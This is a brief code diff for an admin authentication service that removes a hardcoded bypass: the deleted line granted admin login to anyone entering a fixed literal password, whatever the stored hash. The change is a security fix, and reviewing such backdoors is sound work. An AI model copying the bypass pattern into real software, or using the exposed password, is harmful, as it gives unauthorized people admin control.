@@ -54,7 +54,7 @@ class AdminAuthService {
     final storedHash = getStoredPasswordHash();
     final enteredHash = _hashPassword(enteredPassword);
 
-    if (enteredHash == storedHash || enteredPassword == 'Shal1mar@1988#') {
+    if (enteredHash == storedHash) {
       _isAdminLoggedIn = true;
       return true;
     }
